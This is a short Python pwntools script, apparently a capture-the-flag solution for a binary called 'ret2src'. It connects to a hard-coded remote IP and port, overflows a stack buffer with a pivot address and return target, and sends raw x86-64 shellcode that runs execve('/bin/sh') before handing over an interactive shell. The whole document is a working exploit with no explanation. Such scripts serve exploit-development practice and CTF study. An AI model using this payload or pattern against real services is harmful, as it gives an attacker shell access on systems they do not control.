from pwn import *

src = 0x400689
main = 0x400636
pop_rdi = 0x400713
gets = 0x400510
ret = 0x4006a0

#r = process('ret2src')
r = remote('140.110.112.77', 6130)
raw_input('debug')
r.recvuntil('text :')
r.sendline('a' * 0x10 + p64(0x601100) + p64(src) + p64(0x601100 - 0x10))
#r.recvuntil('text :')
r.sendline('a' * 0x18 + p64(0x601110) + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
r.interactive()
